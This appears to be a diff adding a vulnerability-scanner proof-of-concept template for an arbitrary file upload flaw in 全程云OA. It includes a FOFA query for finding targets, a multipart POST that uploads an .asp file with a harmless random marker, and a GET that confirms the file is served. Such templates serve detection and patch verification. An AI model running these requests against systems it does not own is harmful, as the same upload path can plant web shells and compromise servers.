@@ -1,0 +1,31 @@
+id: poc-yaml-quan-cheng-yun-uploadfile-anyfile-upload
+info:
+  name: 全程云OA UploadFile 任意文件上传漏洞
+  severity: critical
+  tags:
+  - 文件上传
+  finger: 全程云OA
+  fofa: body="全程云OA" || body="images/yipeoplehover.png"
+variables:
+  t1: random_str(8)
+  t2: base64(t1)
+requests:
+- method: POST
+  path: /OA/api/2.0/Common/AttachFile/UploadFile
+  headers:
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryNe8DcVuv1vEUWDaR
+  data: '------WebKitFormBoundaryNe8DcVuv1vEUWDaR
+
+    Content-Disposition: form-data; name="upload";filename="{{.t1}}.asp"
+
+
+    {{.t2}}
+
+    ------WebKitFormBoundaryNe8DcVuv1vEUWDaR--'
+  expression: status_code == 200 && contains(body,"\"fileTargetPath\":")
+  output:
+  - regex_match(body,`\\(?P<file>[a-z0-9-]+).asp`)
+- method: GET
+  path: /OA/upfiles/temp/{{.file}}.asp
+  expression: status_code == 200 && body == t2
+transport: http
